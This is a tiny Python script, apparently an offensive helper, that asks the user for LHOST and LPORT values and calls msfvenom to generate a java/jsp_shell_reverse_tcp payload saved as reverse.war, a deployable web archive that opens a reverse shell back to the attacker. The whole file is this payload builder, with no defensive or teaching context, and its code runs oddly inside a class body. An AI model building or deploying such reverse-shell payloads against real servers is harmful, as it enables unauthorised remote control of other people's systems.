import os
import subprocess


def clear():
    subprocess.call("clear")

class ma:
    clear()
    f = input("add LHOST=")
    print(f)
    c = input("add LPORT=")
    print(c)
    os.system("msfvenom -p java/jsp_shell_reverse_tcp LHOST=" + f + " " + "LPORT=" + c + " " + "-f war > reverse.war")